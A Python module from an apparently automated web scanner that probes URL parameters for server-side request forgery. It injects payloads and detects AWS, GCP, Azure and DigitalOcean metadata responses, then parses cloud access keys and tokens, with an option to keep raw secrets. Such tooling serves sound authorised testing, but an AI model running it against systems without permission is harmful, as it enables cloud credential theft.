"""Skill: test_ssrf — SSRF on URL-accepting parameters."""
from __future__ import annotations
import asyncio
import json
import logging
import re
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

SSRF_PAYLOADS = _load_ds("test_ssrf", "ssrf_payloads")  # ADR-007 Phase 3-9 — data in data/payloads/test_ssrf.json

URL_PARAMS = _load_ds("test_ssrf", "url_params")  # ADR-007 Phase 3-9 — data in data/payloads/test_ssrf.json
HIGH_SIGNAL_PARAMS = tuple(_load_ds("test_ssrf", "high_signal_params"))
_SSRF_DOCTRINE = list(_load_ds("test_ssrf", "doctrine"))

_SSRF_FALLBACK_PARAMS = ("url", "uri", "dest", "redirect", "next", "return", "callback")

_CLOUD_SECRET_KEYS = (
    "SecretAccessKey",
    "Token",
    "SessionToken",
    "access_token",
    "refresh_token",
    "client_secret",
)


def _mask_value(value: str, *, keep: int = 4) -> str:
    text = str(value or "")
    if len(text) <= keep:
        return "[redacted]"
    return f"{text[:keep]}...[redacted]"


def _redact_cloud_secrets(text: str, *, limit: int = 600) -> str:
    redacted = str(text or "")
    for key in _CLOUD_SECRET_KEYS:
        redacted = re.sub(
            rf'("{re.escape(key)}"\s*:\s*")([^"]+)(")',
            lambda m: f"{m.group(1)}{_mask_value(m.group(2))}{m.group(3)}",
            redacted,
            flags=re.IGNORECASE,
        )
    redacted = re.sub(
        r"\b(ASIA|AKIA)[A-Z0-9]{12,}\b",
        lambda m: _mask_value(m.group(0), keep=6),
        redacted,
    )
    redacted = " ".join(redacted.split())
    return redacted[:limit]


def _json_obj(text: str) -> dict[str, Any]:
    try:
        value = json.loads(text)
    except Exception:
        return {}
    return value if isinstance(value, dict) else {}


def _find_json_value(text: str, key: str) -> str:
    match = re.search(rf'"{re.escape(key)}"\s*:\s*"([^"]+)"', text, flags=re.IGNORECASE)
    return match.group(1) if match else ""


def _cloud_provider_hint(payload: str, desc: str, text: str, headers: Any = None) -> str:
    blob = f"{payload} {desc} {text[:1000]}".lower()
    header_blob = ""
    try:
        header_blob = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
    except Exception:
        header_blob = ""
    blob = f"{blob} {header_blob}"
    if "metadata.google" in blob or "metadata-flavor" in blob or "computeMetadata" in text:
        return "gcp"
    if "api-version=2021" in blob or "/metadata/instance" in blob or "subscriptionid" in blob:
        return "azure"
    if "accesskeyid" in blob or "secretaccesskey" in blob or "iam/security-credentials" in blob:
        return "aws"
    if "169.254.169.254" in blob and "latest/meta-data" in blob:
        return "aws"
    if "digitalocean" in blob or "/metadata/v1/" in blob:
        return "digitalocean"
    return ""


def _extract_cloud_metadata(
    *,
    text: str,
    payload: str,
    desc: str,
    headers: Any = None,
    retain_secret_material: bool = False,
) -> dict[str, Any]:
    provider = _cloud_provider_hint(payload, desc, text, headers)
    if not provider:
        return {}

    lower = text.lower()
    data = _json_obj(text)
    fields: list[str] = []
    credential: dict[str, Any] = {
        "provider": provider,
        "payload": payload,
        "redacted_preview": _redact_cloud_secrets(text),
    }

    if provider == "aws":
        access_key = str(data.get("AccessKeyId") or _find_json_value(text, "AccessKeyId"))
        secret_key = str(data.get("SecretAccessKey") or _find_json_value(text, "SecretAccessKey"))
        token = str(data.get("Token") or _find_json_value(text, "Token"))
        expiration = str(data.get("Expiration") or _find_json_value(text, "Expiration"))
        if access_key:
            fields.append("AccessKeyId")
            credential["access_key_id"] = _mask_value(access_key, keep=6)
            if retain_secret_material:
                credential["access_key_id_raw"] = access_key
        if secret_key:
            fields.append("SecretAccessKey")
            credential["has_secret_access_key"] = True
            if retain_secret_material:
                credential["secret_access_key"] = secret_key
        if token:
            fields.append("Token")
            credential["has_session_token"] = True
            if retain_secret_material:
                credential["session_token"] = token
        if expiration:
            credential["expiration"] = expiration
        if not fields and ("iam/security-credentials" in payload or "accesskeyid" in lower):
            fields.append("metadata_role_or_listing")
    elif provider in {"gcp", "azure"}:
        access_token = str(data.get("access_token") or _find_json_value(text, "access_token"))
        expires_in = str(data.get("expires_in") or data.get("expires_on") or "")
        client_id = str(data.get("client_id") or _find_json_value(text, "client_id"))
        if access_token:
            fields.append("access_token")
            credential["has_access_token"] = True
            credential["access_token_preview"] = _mask_value(access_token)
            if retain_secret_material:
                credential["access_token"] = access_token
        if expires_in:
            credential["expiration"] = expires_in
        if client_id:
            credential["client_id"] = client_id
        if not fields and any(
            marker in lower
            for marker in ("service-accounts", "compute", "subscriptionid", "resourcegroupname")
        ):
            fields.append("metadata_document")
    elif provider == "digitalocean":
        if any(marker in lower for marker in ("droplet_id", "hostname", "vendor_data", "user_data")):
            fields.append("metadata_document")

    if not fields:
        return {}
    credential["fields"] = sorted(set(fields))
    return {
        "provider": provider,
        "credential_fields": credential["fields"],
        "cloud_credentials": credential if any("token" in f.lower() or "key" in f.lower() for f in fields) else {},
        "cloud_metadata": {
            "provider": provider,
            "payload": payload,
            "fields": credential["fields"],
            "redacted_preview": credential["redacted_preview"],
        },
        "credential_evidence": {
            "provider": provider,
            "fields": credential["fields"],
            "redacted_preview": credential["redacted_preview"],
        },
    }


def _ssrf_payloads_for_round(round_num: int) -> list[dict[str, str]]:
    if round_num <= 0 or round_num >= 4:
        return list(SSRF_PAYLOADS)
    if round_num == 1:
        return list(SSRF_PAYLOADS[:8])
    if round_num == 2:
        return list(SSRF_PAYLOADS[8:16])
    return list(SSRF_PAYLOADS[16:])


def _fallback_params_for_url(url: str) -> list[str]:
    lower = url.lower()
    if any(token in lower for token in ("redirect", "return", "next", "continue")):
        return ["redirect", "next", "return", "url"]
    if any(token in lower for token in ("image", "avatar", "fetch", "proxy", "import", "load")):
        return ["url", "uri", "src", "image"]
    if any(token in lower for token in ("webhook", "callback", "notify", "ping")):
        return ["callback", "webhook", "url", "dest"]
    return list(_SSRF_FALLBACK_PARAMS)


def _select_target_params(
    url: str,
    param_name: str | None = None,
    *,
    limit: int = 4,
) -> tuple[list[str], dict[str, list[str]], Any]:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if param_name:
        if param_name in params:
            return [param_name], params, parsed
        synthetic = {param_name: [""]}
        return [param_name], synthetic, parsed

    target_params = [p for p in URL_PARAMS if p in params]
    if target_params:
        return target_params[:limit], params, parsed

    if params:
        hinted: list[str] = []
        fallback: list[str] = []
        for key in params.keys():
            lower = key.lower()
            if any(token in lower for token in HIGH_SIGNAL_PARAMS):
                hinted.append(key)
            else:
                fallback.append(key)
        ordered = hinted + fallback
        return ordered[:limit], params, parsed

    return _fallback_params_for_url(url)[:limit], {}, parsed


def _doctrine_rows_for_param(url: str, param_name: str) -> list[dict[str, str]]:
    lower = f"{url} {param_name}".lower()
    if any(token in lower for token in ("url", "uri", "src", "redirect", "next", "callback", "webhook", "proxy", "fetch", "load", "import", "file")):
        return list(_SSRF_DOCTRINE)
    return []


async def execute(url: str, param_name: str | None = None, round: int = 1, **kwargs: Any) -> dict[str, Any]:
    """Test SSRF on URL-accepting parameters.

    Returns:
        {
            "vulnerable": bool,
            "findings": [...],
            "baseline": {"status": int, "size": int, "preview": str},
            "control_evidence": {"baseline": {...}, "interesting_responses": [...]},
            "tested": int,
            "url": str,
        }
    """
    from urllib.parse import urlparse as _urlparse
    from vxis.interaction.hands import SessionManager

    _base = _urlparse(url)
    _base_url = f"{_base.scheme}://{_base.netloc}"
    payloads = _ssrf_payloads_for_round(round)
    retain_secret_material = bool(
        kwargs.get("retain_secret_material")
        or kwargs.get("retain_cloud_secret_material")
    )

    parsed = urlparse(url)
    target_params, params, parsed = _select_target_params(url, param_name)

    findings: list[dict[str, Any]] = []
    control_evidence: list[dict[str, Any]] = []
    tested = 0
    sem = asyncio.Semaphore(15)

    _mgr = SessionManager()
    _session = await _mgr.get_session(_base_url)

    # Get baseline
    try:
        base_r = await _session.request("GET", url)
        baseline_size = base_r.body_length
        baseline_status = base_r.status
    except Exception as e:
        return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}

    async def test_payload(p: dict[str, str]) -> None:
        nonlocal tested
        async with sem:
            for target_param in target_params:
                tested += 1
                new_params = dict(params)
                new_params[target_param] = [p["payload"]]
                query = urlencode({k: v[0] for k, v in new_params.items()})
                test_url = urlunparse(parsed._replace(query=query))
                doctrine_rows = _doctrine_rows_for_param(url, target_param)

                try:
                    r = await _session.request("GET", test_url)
                except Exception:
                    continue

                body = r.text.lower()
                size = r.body_length
                cloud_signal = _extract_cloud_metadata(
                    text=r.text,
                    payload=p["payload"],
                    desc=p["desc"],
                    headers=getattr(r, "headers", {}),
                    retain_secret_material=retain_secret_material,
                )
                response_preview = (
                    cloud_signal.get("credential_evidence", {}).get("redacted_preview", "")
                    if cloud_signal
                    else r.text[:300]
                )

                if cloud_signal:
                    has_creds = bool(cloud_signal.get("cloud_credentials"))
                    finding = {
                        "type": "ssrf_cloud_metadata_credentials"
                        if has_creds
                        else "ssrf_cloud_metadata",
                        "payload": p["payload"],
                        "param": target_param,
                        "desc": p["desc"],
                        "evidence": (
                            f"Detected {cloud_signal['provider']} metadata "
                            f"fields {cloud_signal.get('credential_fields', [])} "
                            f"in response (status {r.status})"
                        ),
                        "response_preview": response_preview,
                        "control": {
                            "baseline_status": baseline_status,
                            "baseline_size": baseline_size,
                            "payload_status": r.status,
                            "payload_size": size,
                            "matched_signal": ",".join(
                                cloud_signal.get("credential_fields", [])
                            ),
                            "baseline_preview": base_r.text[:180],
                            "payload_preview": response_preview[:180],
                        },
                        "severity": "critical" if has_creds else "high",
                        "doctrine": doctrine_rows,
                        "cloud_metadata": cloud_signal.get("cloud_metadata"),
                        "credential_evidence": cloud_signal.get("credential_evidence"),
                    }
                    if cloud_signal.get("cloud_credentials"):
                        finding["cloud_credentials"] = cloud_signal["cloud_credentials"]
                    findings.append(finding)
                    logger.info(
                        "SSRF cloud metadata found: %s via %s",
                        cloud_signal["provider"],
                        target_param,
                    )
                    return

                if p["detect"] and p["detect"].lower() in body:
                    findings.append({
                        "type": "ssrf",
                        "payload": p["payload"],
                        "param": target_param,
                        "desc": p["desc"],
                        "evidence": f"Detected '{p['detect']}' in response (status {r.status})",
                        "response_preview": response_preview,
                        "control": {
                            "baseline_status": baseline_status,
                            "baseline_size": baseline_size,
                            "payload_status": r.status,
                            "payload_size": size,
                            "matched_signal": p["detect"],
                            "baseline_preview": base_r.text[:180],
                            "payload_preview": response_preview[:180],
                        },
                        "severity": "critical",
                        "doctrine": doctrine_rows,
                    })
                    logger.info("SSRF found: %s via %s", p["desc"], target_param)
                    return

                if size > baseline_size + 200 and r.status == 200:
                    findings.append({
                        "type": "ssrf_possible",
                        "payload": p["payload"],
                        "param": target_param,
                        "desc": p["desc"],
                        "evidence": f"Response size {size} vs baseline {baseline_size} (status {r.status})",
                        "response_preview": response_preview,
                        "control": {
                            "baseline_status": baseline_status,
                            "baseline_size": baseline_size,
                            "payload_status": r.status,
                            "payload_size": size,
                            "baseline_preview": base_r.text[:180],
                            "payload_preview": response_preview[:180],
                        },
                        "severity": "high",
                        "doctrine": doctrine_rows,
                    })
                control_evidence.append({
                    "payload": p["payload"],
                    "desc": p["desc"],
                    "param": target_param,
                    "status": r.status,
                    "size": size,
                    "baseline_status": baseline_status,
                    "baseline_size": baseline_size,
                    "response_preview": response_preview[:180],
                    "doctrine_families": [row.get("family", "") for row in doctrine_rows],
                })

    await asyncio.gather(*[test_payload(p) for p in payloads])

    # Deduplicate
    seen: set[str] = set()
    unique: list[dict[str, Any]] = []
    for f in findings:
        key = f"{f['type']}:{f['payload']}"
        if key not in seen:
            seen.add(key)
            unique.append(f)
    cloud_credentials = [
        f.get("cloud_credentials")
        for f in unique
        if isinstance(f, dict) and f.get("cloud_credentials")
    ]
    cloud_metadata = [
        f.get("cloud_metadata")
        for f in unique
        if isinstance(f, dict) and f.get("cloud_metadata")
    ]

    return {
        "vulnerable": len(unique) > 0,
        "findings": unique,
        "cloud_credentials": cloud_credentials,
        "cloud_metadata": cloud_metadata,
        "surface_hints": [
            {
                "param": param,
                "doctrine": _doctrine_rows_for_param(url, param),
            }
            for param in target_params
        ],
        "baseline": {
            "status": baseline_status,
            "size": baseline_size,
            "preview": base_r.text[:240],
        },
        "control_evidence": {
            "baseline": {
                "status": baseline_status,
                "size": baseline_size,
                "preview": base_r.text[:240],
            },
            "interesting_responses": control_evidence[:10],
        },
        "tested": tested,
        "url": url,
        "param": param_name or (target_params[0] if target_params else "url"),
        "tested_params": target_params,
        "round": round,
    }
